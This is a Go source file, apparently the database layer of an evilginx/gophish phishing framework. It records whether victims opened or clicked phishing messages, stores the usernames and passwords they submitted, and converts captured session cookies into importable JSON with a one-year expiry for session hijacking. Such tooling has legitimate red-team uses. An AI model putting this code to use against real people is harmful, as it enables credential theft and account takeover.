package database

import (
    "encoding/json"
    "strconv"

    "github.com/tidwall/buntdb"

    "errors"
    "fmt"
    "time"
    "os/user"
    "path/filepath"
    _ "github.com/mattn/go-sqlite3"
    "github.com/jinzhu/gorm"
)

var egp_db *gorm.DB

type Database struct {
    path string
    db   *buntdb.DB
}

type SentResults struct {
    Id          int64   `json:"id"`
    UserId      int64   `json:"user_id"`
    RId         string  `json:"rid"`
    Victim      string  `json:"victim"`
    SMSTarget   bool    `json:"sms_target"`
}

type OpenedResults struct {
    Id          int64   `json:"id"`
    UserId      int64   `json:"user_id"`
    RId         string  `json:"rid"`
    Victim      string  `json:"victim"`
    Browser		string  `json:"browser"`
    SMSTarget   bool    `json:"sms_target"`
}

type ClickedResults struct {
    Id          int64   `json:"id"`
    UserId      int64   `json:"user_id"`
    RId         string  `json:"rid"`
    Victim      string  `json:"victim"`
    Browser		string  `json:"browser"`
    SMSTarget   bool    `json:"sms_target"`
}

type SubmittedResults struct {
    Id          int64   `json:"id"`
    UserId      int64   `json:"user_id"`
    RId         string  `json:"rid"`
    Username    string  `json:"username"`
    Password    string  `json:"password"`
    Browser		string  `json:"browser"`
}

type CapturedResults struct {
    Id          int64   `json:"id"`
    UserId      int64   `json:"user_id"`
    RId         string  `json:"rid"`
    Tokens      string  `json:"tokens"`
    Browser		string  `json:"browser"`
}

var ErrRIdNotFound = errors.New("RId not found in clicked_results table")

func SetupEGP() error {
    usr, err := user.Current()
    if err != nil {
        fmt.Printf("[-] Getting current user context failed!\n")
        return err
    }
    cfg_dir := filepath.Join(usr.HomeDir, ".evilginx")
    db_path := filepath.Join(cfg_dir, "evilgophish.db")

    // Open our database connection
    i := 0
    for {
        egp_db, err = gorm.Open("sqlite3", db_path)
        if err == nil {
            break
        }
        if err != nil && i >= 10 {
            fmt.Printf("Error connecting to evilgophish.db: %s\n", err)
            return err
        }
        i += 1
        fmt.Println("waiting for database to be up...")
        time.Sleep(5 * time.Second)
    }
            
    return nil
}

func moddedTokensToJSON(tokens map[string]map[string]*Token) string {
    type Cookie struct {
        Path           string `json:"path"`
        Domain         string `json:"domain"`
        ExpirationDate int64  `json:"expirationDate"`
        Value          string `json:"value"`
        Name           string `json:"name"`
        HttpOnly       bool   `json:"httpOnly,omitempty"`
        HostOnly       bool   `json:"hostOnly,omitempty"`
    }

    var cookies []*Cookie
    for domain, tmap := range tokens {
        for k, v := range tmap {
            c := &Cookie{
                Path:           v.Path,
                Domain:         domain,
                ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
                Value:          v.Value,
                Name:           k,
                HttpOnly:       v.HttpOnly,
            }
            if domain[:1] == "." {
                c.HostOnly = false
                c.Domain = domain[1:]
            } else {
                c.HostOnly = true
            }
            if c.Path == "" {
                c.Path = "/"
            }
            cookies = append(cookies, c)
        }
    }

    json, _ := json.Marshal(cookies)
    return string(json)
}

func HandleEmailOpened (rid string, browser map[string]string) error {
    sentResult := SentResults{}
    query := egp_db.Table("sent_results").Where("r_id=?", rid)
    err := query.Scan(&sentResult).Error
    if err != nil {
        return err
    } else if sentResult.RId == "" {
        return ErrRIdNotFound
    } else {
        openedEntry := OpenedResults{}
        openedEntry.Id = sentResult.Id
        openedEntry.RId = rid
        openedEntry.UserId = sentResult.UserId
        openedEntry.Victim = sentResult.Victim
        openedEntry.SMSTarget = sentResult.SMSTarget
        data, err := json.Marshal(browser)
        if err != nil {
            return err
        }
        openedEntry.Browser = string(data)
        return egp_db.Save(openedEntry).Error
    }
}

func HandleClickedLink (rid string, browser map[string]string) error {
    sentResult := SentResults{}
    query := egp_db.Table("sent_results").Where("r_id=?", rid)
    err := query.Scan(&sentResult).Error
    if err != nil {
        return err
    } else if sentResult.RId == "" {
        return ErrRIdNotFound
    } else {
        clickedEntry := ClickedResults{}
        clickedEntry.Id = sentResult.Id
        clickedEntry.RId = rid
        clickedEntry.UserId = sentResult.UserId
        clickedEntry.Victim = sentResult.Victim
        clickedEntry.SMSTarget = sentResult.SMSTarget
        data, err := json.Marshal(browser)
        if err != nil {
            return err
        }
        clickedEntry.Browser = string(data)
        return egp_db.Save(clickedEntry).Error
    }
}

func HandleSubmittedData (rid string, username string, password string) error {
    clickedResult := ClickedResults{}
    query := egp_db.Table("clicked_results").Where("r_id=?", rid)
    err := query.Scan(&clickedResult).Error
    if err != nil {
        return err
    } else if clickedResult.RId == "" {
        return ErrRIdNotFound
    } else {
        submittedEntry := SubmittedResults{}
        submittedEntry.Id = clickedResult.Id
        submittedEntry.RId = rid
        submittedEntry.UserId = clickedResult.UserId
        submittedEntry.Username = username
        submittedEntry.Password = password
        submittedEntry.Browser = clickedResult.Browser
        return egp_db.Save(submittedEntry).Error
    }
}

func HandleCapturedSession (rid string, tokens map[string]map[string]*Token) error {
    clickedResult := ClickedResults{}
    query := egp_db.Table("clicked_results").Where("r_id=?", rid)
    err := query.Scan(&clickedResult).Error
    if err != nil {
        return err
    } else if clickedResult.RId == "" {
        return ErrRIdNotFound
    } else {
        capturedEntry := CapturedResults{}
        capturedEntry.Id = clickedResult.Id
        capturedEntry.RId = rid
        capturedEntry.UserId = clickedResult.UserId
        capturedEntry.Browser = clickedResult.Browser
        json_tokens := moddedTokensToJSON(tokens)
        capturedEntry.Tokens = json_tokens
        return egp_db.Save(capturedEntry).Error
    }
}

func NewDatabase(path string) (*Database, error) {
    var err error
    d := &Database{
        path: path,
    }

    d.db, err = buntdb.Open(path)
    if err != nil {
        return nil, err
    }

    d.sessionsInit()

    d.db.Shrink()
    return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
    _, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
    return err
}

func (d *Database) ListSessions() ([]*Session, error) {
    s, err := d.sessionsList()
    return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
    err := d.sessionsUpdateUsername(sid, username)
    return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
    err := d.sessionsUpdatePassword(sid, password)
    return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
    err := d.sessionsUpdateCustom(sid, name, value)
    return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
    err := d.sessionsUpdateTokens(sid, tokens)
    return err
}

func (d *Database) DeleteSession(sid string) error {
    s, err := d.sessionsGetBySid(sid)
    if err != nil {
        return err
    }
    err = d.sessionsDelete(s.Id)
    return err
}

func (d *Database) DeleteSessionById(id int) error {
    _, err := d.sessionsGetById(id)
    if err != nil {
        return err
    }
    err = d.sessionsDelete(id)
    return err
}

func (d *Database) Flush() {
    d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
    return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
    var id int = 1
    var err error
    err = d.db.View(func(tx *buntdb.Tx) error {
        var s_id string
        if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
            return err
        }
        if id, err = strconv.Atoi(s_id); err != nil {
            return err
        }
        return nil
    })
    return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
    var id int = 1
    var err error
    err = d.db.Update(func(tx *buntdb.Tx) error {
        var s_id string
        if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
            if id, err = strconv.Atoi(s_id); err != nil {
                return err
            }
        }
        tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
        return nil
    })
    return id, err
}

func (d *Database) getPivot(t interface{}) string {
    pivot, _ := json.Marshal(t)
    return string(pivot)
}
